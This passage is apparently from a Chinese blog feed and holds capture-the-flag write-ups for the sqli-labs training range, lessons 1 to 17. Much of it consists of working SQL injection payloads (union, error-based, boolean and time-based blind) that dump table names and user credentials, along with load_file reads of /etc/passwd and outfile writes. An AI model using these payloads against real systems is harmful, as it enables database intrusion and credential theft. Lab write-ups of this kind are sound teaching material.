#编码MSIgb3IgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpKSwweDdlKSktLSAj</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171609918.png" alt="image-20220317160900776"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs靶场记录update型(三)</title>
      <link href="/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95update%E5%9E%8B(%E4%B8%89)/"/>
      <url>/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95update%E5%9E%8B(%E4%B8%89)/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlilabs靶场记录update型-三"><a href="#sqlilabs靶场记录update型-三" class="headerlink" title="sqlilabs靶场记录update型(三)"></a>sqlilabs靶场记录update型(三)</h1><h2 id="mysql增删查改"><a href="#mysql增删查改" class="headerlink" title="mysql增删查改"></a>mysql增删查改</h2><h3 id="增"><a href="#增" class="headerlink" title="增"></a>增</h3><p>增加一行数据:insert</p><pre><code>insert into users values(&#39;15&#39;,&#39;test&#39;,&#39;test&#39;);</code></pre><h3 id="删"><a href="#删" class="headerlink" title="删"></a>删</h3><p>删数据:delete</p><pre><code>delete from table_name;delete from table_name where id=1;</code></pre><p>删结构:drop</p><pre><code>删数据库: drop database 数据库名;删除表: drop table 表名;删除表中的: alter table 表名 drop column 列名;</code></pre><h3 id="改"><a href="#改" class="headerlink" title="改"></a>改</h3><p>修改:update</p><pre><code>修改所有:update 表名 set 列名=&#39;新的值,非数字加单引号&#39;;带条件的修改:update 表名 set 列名=&#39;新的值,非数字加单引号&#39; where id=数字;update users set username=&#39;test2&#39; where id=15;</code></pre><h2 id="less-17基于错误的更新查询POST注入"><a href="#less-17基于错误的更新查询POST注入" class="headerlink" title="less-17基于错误的更新查询POST注入"></a>less-17基于错误的更新查询POST注入</h2><p>这关的场景是登录后再修改密码界面注入,而非登录时</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171431618.png" alt="image-20220317143145469"></p><p>那么这里既然我们已经登录进去了,那么肯定知道一个用户名和密码吧.不然咋登进去的呢.这里我们使用dumb用户为例</p><p>这里的页面是进行密码修改,那么肯定会有对数据库里面密码数据的更新.而数据的更新肯定会用到update函数,但是改谁的密码呢,肯定也是需要查询的.</p><p>判断闭合方式</p><pre><code>uname=Dumb &amp; passwd=1     回显成功更改密码uname=Dumb &amp; passwd=1&#39;    version for the right syntax to use near &#39;Dumb&#39;&#39; at line 1uname=Dumb &amp; passwd=1&quot;  回显成功更改密码</code></pre><p>这里有报错语句,且是单引号进行闭合</p><p>下面是查询username的源码</p><pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;</code></pre><p>从这里我们可以看出,在接受用户名之后,会根据uname查询数据库的username和passwd,如果uname存在的话则用passwd替换password,并显示flag1.jpg若不存在则显示slap1.jpg,</p><p>在用户名正确之后,页面能够返回mysql的错误信息,这就可以利用子查询注入在错误信息中返回想要的数据,注意这里的报错语句实update语句,查询用户名语句已经执行完成,并返回成功了</p><p><strong>子查询注入</strong></p><pre><code>用户名:uname=Dumb&amp;passwd=1&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select user()),floor(rand()*2))as a from information_schema.tables group by a) b) where username=&#39;Dumb&#39; -- #数据库:uname=Dumb&amp;passwd=1&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b) where username=&#39;Dumb&#39; -- #</code></pre><p><strong>updatexml()注入</strong></p><pre><code>数据库:uname=Dumb&amp;passwd=1&#39; or updatexml(1,concat(&#39;#&#39;,(database())),0) -- #uname=Dumb&amp;passwd=1&#39; and updatexml(1,concat(&#39;#&#39;,(database())),0) -- #数据表:uname=Dumb&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),0) -- #列名:uname=Dumb&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;),0x7e),1) -- #</code></pre><p>爆数据时出现了错误</p><pre><code>uname=Dumb&amp;passwd=1&#39; and updatexml(1,concat(&#39;#&#39;,(select concat(id,&#39;#&#39;,username,&#39;#&#39;,password) from users limit 0,1)),0) -- #</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171455169.png" alt="image-20220317145527078"></p><p>不能在FROM子句中为update指定目标表“users”不能先select表中的某些值，再update这个表（在同一语句中）。</p><p>解决方法：将select出的结果作为派生表再select一遍，这样就规避了错误</p><pre><code>uname=Dumb&amp;passwd=1&#39; and updatexml(1,concat(&#39;#&#39;,(select * from (select concat_ws(&#39;#&#39;,id,username,password) from users limit 0,1) a)),0) -- #</code></pre><p>这里的错误信息只显示了一部分，使用了limit偏移注入，所以没有一次性输出所有数据（但可以输出最大32个字符的数据，因updatexml最大爆32个字符），</p><pre><code>uname=Dumb&amp;passwd=1&#39; and updatexml(1,concat(&#39;#&#39;,(select * from (select group_concat(concat_ws(&#39;#&#39;,id,username,password)) from users) a)),0) -- #</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171457141.png" alt="image-20220317145720051"></p><p><strong>extractvalue()注入</strong></p><pre><code>爆数据表:uname=Dumb&amp;passwd=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))-- #</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs靶场记录POST型(二)</title>
      <link href="/ctf/sql/sql-%20sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95POST%E5%9E%8B(%E4%BA%8C)/"/>
      <url>/ctf/sql/sql-%20sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95POST%E5%9E%8B(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlilabs靶场记录POST型-二"><a href="#sqlilabs靶场记录POST型-二" class="headerlink" title="sqlilabs靶场记录POST型(二)"></a>sqlilabs靶场记录POST型(二)</h1><p>接下来就是使用post注入了,这里使用hackbar插件 配合burp</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203162052989.png" alt="image-20220316205212924"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203162052349.png" alt="image-20220316205225285"></p><p>抓包发现post了uname和passwd两个数据</p><h2 id="less-11基于错误的-单引号-字符型"><a href="#less-11基于错误的-单引号-字符型" class="headerlink" title="less-11基于错误的- 单引号 -字符型"></a>less-11基于错误的- 单引号 -字符型</h2><p>先基本测试一下</p><pre><code>uname=1 &amp; passwd=1        无法登录无回显uname=1&#39; &amp; passwd=1        version for the right syntax to use near &#39;1&#39; LIMIT 0,1&#39; at line 1uname=1 &amp; passwd=1&#39;     version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1uname=1&quot; &amp; passwd=1        无法登录无回显uname=1 &amp; passwd=1&quot;        无法登录无回显</code></pre><p>说明是单引号闭合</p><pre><code>uname=1&#39; or 1=1# &amp; passwd=1    万能语句可以登进去uname=1&#39; order by 4# &amp; passwd=1    回显Unknown column &#39;4&#39; in &#39;order clause&#39;uname=1&#39; order by 2# &amp; passwd=1    无法登录无回显</code></pre><p>说明只有两个字段</p><p>开始注数据</p><pre><code>uname=-1&#39; union select 1,database() # &amp; passwd=1    Your Password:securityuname=-1&#39; union select 1,group_concat(schema_name) from information_schema.schemata # &amp; passwd=1uname=-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# &amp; passwd=1uname=-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;# &amp; passwd=1uname=-1&#39; union select 1,group_concat(username,password) from users# &amp; passwd=1</code></pre><h2 id="less-12基于错误的双引号POST型字符型变形的注入"><a href="#less-12基于错误的双引号POST型字符型变形的注入" class="headerlink" title="less-12基于错误的双引号POST型字符型变形的注入"></a>less-12基于错误的双引号POST型字符型变形的注入</h2><pre><code>uname=1 &amp; passwd=1    无法登录无回显uname=1&#39; &amp; passwd=1     无法登录无回显uname=1&quot; &amp; passwd=1     version for the right syntax to use near &#39;1&quot;) LIMIT 0,1&#39; at line 1</code></pre><p>说明是双引号闭合,这里从报错信息可以发现还有一个括号进行保护</p><pre><code>uname=1&quot; or 1=1#&amp; passwd=1    version for the right syntax to use near &#39;&#39; at line 1uname=1&quot;) or 1=1#&amp; passwd=1    正常登录进去</code></pre><p><strong>extractvalue()函数报错注入</strong></p><p>上一关使用了基本查询语句,接下来我们使用mysql函数报错注入,这里选取extractvalue()函数,注意这里的extracectvalue()函数最大爆32位</p><pre><code>uname=1&quot;)  and extractvalue(1,concat(0x7e,(select database()))) #&amp; passwd=1    uname=1&quot;)  and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #&amp; passwd=1    uname=1&quot;)  and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) #&amp; passwd=1uname=1&quot;)  and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) #&amp; passwd=1</code></pre><p>这里会显示不全</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203162127058.png" alt="image-20220316212744988"></p><p>那么我们可以这样写,使用not in()</p><pre><code>uname=1&quot;)  and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#39;Dumb&#39;,&#39;Angelinal&#39;)))) #&amp; passwd=1</code></pre><p><strong>floor()函数报错注入</strong></p><pre><code>uname=1&quot;) Union select count(*),concat((select password from users limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x; #&amp; passwd=1</code></pre><h2 id="less-13-POST单引号变形双注入"><a href="#less-13-POST单引号变形双注入" class="headerlink" title="less-13 POST单引号变形双注入"></a>less-13 POST单引号变形双注入</h2><pre><code>uname=1 &amp; passwd=1    无法登录无回显uname=1&#39; &amp; passwd=1     version for the right syntax to use near &#39;1&#39;) LIMIT 0,1&#39; at line 1uname=1&quot; &amp; passwd=1     无法登录无回显</code></pre><p>说明单引号加括号进行闭合</p><p>这里有报错信息的出现,说明可以使用报错注入</p><pre><code>uname=1&#39;)or 1=1 # &amp; passwd=1    登进去发现没有显示用户信息,显示了一个successfully logged in</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203162137425.png" alt="image-20220316213759334"></p><p>当失败时</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203162138243.png" alt="image-20220316213825162"></p><p>可以发现有显著的不同,那么这里也可以使用布尔盲注来实现</p><p><strong>报错型extractvalue()</strong></p><pre><code>uname=1&#39;) and extractvalue(1,concat(0x7e,(select database()))) -- # &amp;passwd=1</code></pre><p><strong>报错型floor()  又叫双注入</strong></p><pre><code>uname=1&#39;) union select count(*),concat((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x -- #&amp;passwd=1</code></pre><p><strong>布尔盲注</strong></p><p>利用 regexp （正则表达式）获取security数据库中 users 表中的列</p><pre><code>uname=-1&#39;) or 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^userna[a-z]&#39; limit 0,1) -- #&amp;passwd=1        登录成功uname=-1&#39;) or 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^usernaa[a-z]&#39; limit 0,1) -- #&amp;passwd=1        登录失败要注意这里的匹配的username在不断变化</code></pre><h2 id="less-14POST单引号变形双注入"><a href="#less-14POST单引号变形双注入" class="headerlink" title="less-14POST单引号变形双注入"></a>less-14POST单引号变形双注入</h2><p>就测试一下怎么闭合</p><pre><code>uname=1&amp;passwd=1    无法登录无回显uname=1&#39;&amp;passwd=1    无法登录无回显uname=1&quot;&amp;passwd=1    version for the right syntax to use near &#39;1&quot; LIMIT 0,1&#39; at line 1uname=1&quot;or 1=1#&amp;passwd=1    登录成功</code></pre><p>说明是双引号闭合</p><p><strong>报错型extractvalue()</strong></p><pre><code>uname=1&quot;and extractvalue(1,concat(0x7e,(select database()))) -- # &amp;passwd=1</code></pre><p><strong>报错型floor()  又叫双注入</strong></p><pre><code>uname=1&quot; union select count(*),concat((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x -- #&amp;passwd=1</code></pre><h2 id="less-15基于布尔型-x2F-时间延迟单引号POST型盲注"><a href="#less-15基于布尔型-x2F-时间延迟单引号POST型盲注" class="headerlink" title="less-15基于布尔型&#x2F;时间延迟单引号POST型盲注"></a>less-15基于布尔型&#x2F;时间延迟单引号POST型盲注</h2><pre><code>uname=1&amp;passwd=1       登录失败无回显        uname=1&amp;passwd=1    登录失败无回显uname=1&amp;passwd=1&#39;    登录失败无回显        uname=1&#39;&amp;passwd=1    登录失败无回显uname=1&amp;passwd=1&quot;     登录失败无回显        uname=1&quot;&amp;passwd=1    登录失败无回显</code></pre><p>一个报错信息都没有,那么说明是非报错的注入接着测试</p><pre><code>uname=1 or 1=1#&amp;passwd=1    登录失败无回显uname=1&#39; or 1=1#&amp;passwd=1    登录成功uname=1&quot; or 1=1#&amp;passwd=1    登录失败无回显</code></pre><p>这里就知道是单引号闭合</p><p>接下来可以使用布尔盲注,或者时间盲注</p><pre><code>uname=1&#39; or length(database())=8#&amp;passwd=1    登录成功</code></pre><p>当然时间盲注也是可以的</p><pre><code>uname=1&amp;passwd=1&#39; or if(length(database())=8,1,sleep(5))-- #</code></pre><h2 id="less-16基于bool型-x2F-时间延迟的双引号POST型盲注"><a href="#less-16基于bool型-x2F-时间延迟的双引号POST型盲注" class="headerlink" title="less-16基于bool型&#x2F;时间延迟的双引号POST型盲注"></a>less-16基于bool型&#x2F;时间延迟的双引号POST型盲注</h2><p>测试一下闭合方式</p><pre><code>uname=1&quot;) or 1=1#&amp;passwd=1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203162215208.png" alt="image-20220316221510102"></p><p>太好了</p><pre><code>uname=1&quot;) or 1=1#&amp;passwd=uname=1&amp;passwd=1&quot;) or if(length(database())=8,1,sleep(5))-- #</code></pre><p>和上一关语句一个样,接下来就很简单了</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs靶场记录GET型(一)</title>
      <link href="/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95GET%E5%9E%8B(%E4%B8%80)/"/>
      <url>/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95GET%E5%9E%8B(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlilabs靶场记录GET型-一"><a href="#sqlilabs靶场记录GET型-一" class="headerlink" title="sqlilabs靶场记录GET型(一)"></a>sqlilabs靶场记录GET型(一)</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><pre><code>show databases:     显示数据库use security;        使用数据库show tables;        展示表名desc emails;        对某张表降序显示information_schema    系统数据库</code></pre><p>其中schema代表数据库</p><p><strong>基础查询语句</strong></p><p>查询数据库</p><pre><code>select schema_name from information_schema.schemata;</code></pre><p>使用下面的语句可查所以表名</p><pre><code>select table_name from information_schema.tables where table_schema=&quot;security&quot;;</code></pre><p>猜表的所有列</p><pre><code>select column_name from information_schema.columns where table_name=&#39;xxx&#39;;</code></pre><p>查询字段内容</p><pre><code>select id,email_id from emails;</code></pre><p><strong>limit</strong></p><p>返回前三条数据</p><pre><code>select * from users limit 3;</code></pre><p>从索引1开始的前两条数据</p><pre><code>select * from users limit 1,2;</code></pre><p><strong>concat()</strong></p><p>用于连接字符串</p><pre><code>select concat(&#39;11&#39;,&#39;22&#39;,&#39;33&#39;);    输出112233select concat_ws(&#39;-&#39;,&#39;11&#39;,&#39;22&#39;,&#39;33&#39;);    输出11-22-33group_concat(column_name)    将字段的所有数据用,连接作为字符串输出</code></pre><p><strong>内置数据库information_schema</strong></p><pre><code>里面有三张表:schemata tables columnsschemata表中存储了mysql中所有数据库的信息包括数据库名编码类型tables表中存储了mysql中所有的数据库的表的信息columns表中存储了mysql中所有表的字段信息</code></pre><p><strong>order by</strong></p><pre><code>select * from table_name order by 3     按第三列排序order by column_name asc(升序)/desc(降序)</code></pre><p><strong>union</strong></p><pre><code>两个查询的列数必须相同select 返回的数据必须相同类型</code></pre><p><strong>user表</strong></p><pre><code>mysql中存在一个独立的数据库,名字叫做mysql,当中有很多表,保存着mysql中的各种参数,其中user表段设置了mysql数据库用户的部分信息user表段中,user字段为用户登录名,可以有相同的名字重复password字段为登录的密码哈希值,是40位的密文,类似于md5host字段设置的是这个用户可以在哪些机器上面的登录,如果为localhost表示只能在本机登录,host可以是数据库ip也可以是数据库服务器的名称,若host为localhost的话不一定没有希望,如果服务器网站装有phpmyadmin,仍可以利用file_priv字段规定了这个用户是不是可以读取硬盘的里的文件,设置为Y表示允许,设置为N表示禁止</code></pre><p><strong>参数</strong></p><pre><code>user():    数据库的用户格式为user@serverdatabase(): 当前数据库名version(): 当前使用数据库的版本@@datadir: 数据路径.通常用于load_file是猜测网站路径@@version_compile_os: 操作系统版本concat(): 联合数据concat(username,0x3a,password)中间加一个hex编码值,表示冒号group_concat(): 联合数据concat_ws(separator,str1,str2,...): 含有分隔符地连接字符串hex()和unhex(): 有一些注入点由于数据库中数据字段类型定义,可以不支持union来显示某些不同类型的内容,所以使用hex对数据进行hex编码,例如 union select hex(password) from mysql.user注入出来的数据全是0x1234abc类似的数据,再次转回数据即可load_file(): 这是mysql以文本读取文件的参数 例如:linux系统的网站load_file(&#39;/etc/passwd&#39;)或者windows系统的网站load_file(&#39;c:boot.ini&#39;),这个参数的前提是你的user()用户在mysql.user表中的字段file_priv设置为Y.但是要注意的是如果为windows系统,保险起见将路径设置为双斜杠\\,目的是为了防止转义很多时候php的网站会设置gpf为on,对特殊字符自动转义.那么load_file(&#39;c:boot.ini&#39;)就变成load_file(\&#39;c:\\\\boot.ini\&#39;)出现语法错误解决方法就是将c:\\boot.ini进行hex编码,得到0x633a5c5c6将原句修改为 union select 1,load_file(0x12424324),接可以使用load_file参数后面不加&#39;select xxoo into outfile &#39;路径&#39; : 写文件</code></pre><p><strong>常用命令</strong></p><pre><code>查询所有用户select Host,User,Password from user;查询用户权限:all表示所有权限,select表示只查穿线,update表示只改权限,delete表示只删权限show grants for &quot;user&quot;@&quot;host&quot;;show grants for &quot;root&quot;@&quot;localhost&quot;;添加授权用户(新创建的用户,默认情况下是没有任何权限的):使用root用户连接到服务器create user &quot;用户名&quot;@&quot;IP地址&quot; indentified by &quot;密码&quot;;create user &quot;haidon&quot;@&quot;%&quot; identified by &quot;123456&quot;;create user &quot;haidpm&quot;@&quot;loaclhost&quot; identified by &quot;123456&quot;;IP地址表示方法:% 表示用户可以从任何地址连接到服务器localhost 表示用户只能从本地连接到服务器指定一个ip表示用户只能从此ip连接到服务器分配用户权限(给用户授权)grant 权限列表 on 库.表 to &quot;用户名&quot;@&quot;ip地址&quot; with grant option;grant all privileges on *.* to &quot;haidon&quot;@&quot;%&quot; with grant option;grant all privileges on *.* to &quot;haidon&quot;@&quot;%&quot; identified by &#39;test&#39; with grant option; grant all privileges on domain_check.tb_user to &quot;haidon&quot;@&quot;localhost&quot; with grant option;grant select on domain_check.tb_user to &quot;haidon&quot;@&quot;localhost&quot; with grant option;grant select,insert on domain_check.tb_user to &quot;haidon&quot;@&quot;132.24.98.25&quot; with grant option;  1.权限列表：select、update、delete、insert、alter、drop、create、...(show)2.库.表：*.*表示所有库的所有表。with grant option表示它具有grant权限。密码是test。 3.如果带了 with grant option，那么用户haidon可以将select ,update权限传递给其他用户( 如xiaodon)。4.如果没带 with grant option，那么用户haidon不能给用户xiaodon授权。5.all后面加上privileges，具体到哪些权限时得看MySQL版本，5.7版本不加privileges，8.0版本加privileges。6. insert into user values(&quot;%&quot;,&quot;haidon&quot;,password(&quot;test&quot;),&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;); flush privileges; 这两句和上面第3句grant的效果是一样的。7.insert into user (host,user) values(&quot;132.24.98.25&quot;,&quot;haidon&quot;);insert into db values(&quot;132.24.98.25&quot;,&quot;haidon&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;N&quot;,&quot;N&quot;,&quot;N&quot;,&quot;N&quot;) flush privileges; 这三句和上面第6句grant的效果是一样的。收回用户权限revoke all on *.* from &quot;haidon&quot;@&quot;localhost&quot;;revoke all on domain_check.tb_user from &quot;haidon&quot;@&quot;localhost&quot;;revoke select  on *.* from &quot;haidon&quot;@&quot;localhost&quot;; 删除授权用户drop user &quot;用户名&quot;@&quot;ip地址&quot;drop user &quot;haidon&quot;@&quot;%&quot;delete from user where user=&#39;haidon&#39;; flush privileges; </code></pre><h2 id="less-1获取-基于错误-单引号-字符串"><a href="#less-1获取-基于错误-单引号-字符串" class="headerlink" title="less-1获取-基于错误-单引号-字符串"></a>less-1获取-基于错误-单引号-字符串</h2><p>id后加一个’出现报错语句</p><pre><code>http://127.0.0.1/sqlilabs/Less-1/?id=1&#39;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151815375.png" alt="image-20220315181520310"></p><p>那么我们需要去掉多余的’接使用</p><pre><code>1&#39;or 1=1--+</code></pre><p>#是%23 空格时%20 ‘是%27 + 是空格</p><p>当分别尝试?id&#x3D;1    ？id&#x3D;1’   ?id&#x3D;1” 为什么只有?id&#x3D;1’ 报错？<br>     那是因为Mysql查询并不严格， 而在select * from users where id&#x3D;’1’’ limit 0,1  中有一个单引号没有闭合而报错，而在select * from users where id&#x3D;’1” ‘ limit 0,1  中虽然多了一个双引号，但mysql查询时会把它当成两个单引号，而这两个单引号又闭合了，所以查询时不会报错</p><p>根据报错猜测sql语句应该是</p><pre><code>select username,password from users where id=&#39;$_GET[id]&#39; limit 0,1;</code></pre><p>那么当我们传入1’时</p><p>得到</p><pre><code>select username,password from users where id=&#39;1&#39;&#39; limit 0,1;</code></pre><p>会产生单数的单引号,那么接下来应该把这个单引号注释掉加上–+ 或者 #</p><p>发现在家–+ 或%23时+是空格的意思也是%20  #是%23</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151824310.png" alt="image-20220315182431253"></p><pre><code>id=1&#39; order by 4--+</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151825132.png" alt="image-20220315182535082"></p><p>这时会爆不知道4在哪里说明多了</p><pre><code>id=1&#39; order by 3--+</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151826059.png" alt="image-20220315182652005"></p><p>这说明总共有三列数据</p><ul><li><p>接着使用union联合查询将两个sql语句进行联合</p></li><li><p>union前后的两个sql语句的选择列数必须相同才可以</p></li><li><p>对于union而言,如果第一个sql语句的查询语句为错误的话,那么他会将第二个sql语句的查询结果作为最后的数据,所以前面一个id输入一个非正确的值,如-1</p></li></ul><pre><code>id=-1&#39;union select 1,2,3--+</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151831001.png" alt="image-20220315183100939"></p><p>发现23有回显</p><pre><code>接着爆数据库id=-1&#39;union select 1,group_concat(schema_name),3 from information_schema.schemata--+爆表名id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+爆字段名id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+爆数据名id=-1&#39;union select 1,group_concat(username,password),3 from security.users--+id=-1&#39;union select 1,group_concat(username,password),3 from users--+</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151837257.png" alt="image-20220315183740190"></p><h2 id="less-2获取-基于错误-基于整数"><a href="#less-2获取-基于错误-基于整数" class="headerlink" title="less-2获取-基于错误-基于整数"></a>less-2获取-基于错误-基于整数</h2><p>当尝试id&#x3D;1 id&#x3D;1’ id&#x3D;1” 发现 id&#x3D;1’ id&#x3D;1”报错,这说明是数字型注入</p><p>这里相比于less1的sql语句</p><pre><code>select username,password from users where id=$_GET[id] limit 0,1</code></pre><p>可以尝试</p><pre><code>id=1 and 1=1--+        正常        id=-1 or 1=1--+        正常id=1 and 1=2--+        报错        id=-1 or 1=2--+        报错</code></pre><p>接下来就是注入数据了</p><pre><code>id=1 order by 4--+id=1 order by 3--+id=-1 union select 1,2,3--+id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot;--+id=-1 union select 1,group_concat(username,password),3 from users--+</code></pre><h2 id="less-3基于错误-带括号的单引号字符串"><a href="#less-3基于错误-带括号的单引号字符串" class="headerlink" title="less-3基于错误-带括号的单引号字符串"></a>less-3基于错误-带括号的单引号字符串</h2><p>看起来是单引号外面又加了一个圆括号</p><p>源码</p><pre><code>select * from users where id=(&#39;$id&#39;) limit 0,1;</code></pre><pre><code>?id=&#39;)--+</code></pre><p>注入数据</p><pre><code>id=1&#39;) order by 4--+id=1&#39;) order by 3--+id=-1&#39;) union select 1,2,3--+id=-1&#39;)union select 1,group_concat(schema_name),3 from information_schema.schemata--+id=-1&#39;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+id=-1&#39;)union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot;--+id=-1&#39;)union select 1,group_concat(username,password),3 from users--+</code></pre><h2 id="less-4基于错误的GET双引号字符型注入"><a href="#less-4基于错误的GET双引号字符型注入" class="headerlink" title="less-4基于错误的GET双引号字符型注入"></a>less-4基于错误的GET双引号字符型注入</h2><p>源码</p><pre><code>select * from users where (&quot;id&quot;) limit 0,1;</code></pre><p>直接闭合注入</p><pre><code>id=1&quot;)</code></pre><p>注入数据</p><pre><code>id=1&quot;) order by 4--+id=1&quot;) order by 3--+id=-1&quot;) union select 1,2,3--+id=-1&quot;)union select 1,group_concat(schema_name),3 from information_schema.schemata--+id=-1&quot;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+id=-1&quot;)union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot;--+id=-1&quot;)union select 1,group_concat(username,password),3 from users--+</code></pre><h2 id="less-5双注入GET单引号字符型注入"><a href="#less-5双注入GET单引号字符型注入" class="headerlink" title="less-5双注入GET单引号字符型注入"></a>less-5双注入GET单引号字符型注入</h2><p>这里先经过简单尝试发现有注入并且是’闭合</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h3><p>测试一下</p><pre><code>id=1&#39; and 1=1--+     回显you are in....id=1&#39; and 1=2--+    无回显</code></pre><p>因此当查询语句正确是返回you are in…错误时无回显</p><p>数据库长度</p><pre><code>id=1&#39;and length(database())=8--+    回显you are in....id=1&#39;and length(database())=7--+    无回显</code></pre><p>说明数据库长度是8</p><p>那么接下来就可以写脚本来查询数据了</p><p>注意这里还可以使用其他类似的函数去截取数据,如substr,和ascii返回ascii值</p><pre><code>id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1))=&#39;a&#39;-- #</code></pre><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p><strong>sleep()函数</strong></p><pre><code>id=1&#39; and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- #当正确时无明显延迟,错误有明显延迟</code></pre><p><strong>benchmakrk()函数</strong></p><pre><code>id=1&#39; UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null)),2,3 FROM (select database() as current) as tb1-- #</code></pre><h3 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a><strong>双查询注入</strong></h3><p>这里我们使用的语句</p><pre><code>id=-1&#39;union select count(*),count(*), concat(&#39;~&#39;,(select database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+id=-1&#39;union select count(*),count(*), concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+这里修改limit x,1可以遍历数据?id=-1&#39; union select count(*),1, concat(&#39;~&#39;,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+?id=-1&#39; union select count(*),1, concat(&#39;~&#39;,(select concat_ws(&#39;|||&#39;,password,username) from users limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by 